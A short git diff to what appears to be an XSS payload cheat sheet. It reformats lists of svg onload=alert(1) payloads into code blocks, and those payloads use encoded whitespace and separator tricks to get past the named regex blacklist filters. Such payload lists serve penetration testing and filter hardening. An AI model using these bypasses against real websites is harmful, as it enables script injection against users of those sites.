@@ -126,17 +126,20 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ### Regex Blacklist Filtering
 
 (on\w+\s*=)  
-`<svc/onload=alert(1)>`  
-`<svg//////onload=alert(1)>`  
-`<svg id=x;onload=alert(1)>`   
-`<svg id=\`x\`onload=alert(1)>` 
+```
+<svc/onload=alert(1)> 
+<svg//////onload=alert(1)>  
+<svg id=x;onload=alert(1)>   
+<svg id=`x`onload=alert(1)>
+```
 
 (?i)([\s\"'`;\/0-9\=]+on\w+\s*=)  
-`<svg onload%09=alert(1)>`  
-`<svg %09onload=alert(1)>`   
-`<svg %09onload%20=alert(1)>` 
-`<svg onload%09%20%28%2C%3B=alert(1)>`  
-`<svg onload%0B=alert(1)>`  
+```
+<svg onload%09=alert(1)> 
+<svg %09onload=alert(1)>   
+<svg %09onload%20=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<svg onload%0B=alert(1)>```  
 
 ### Keyword Based in Filter
  
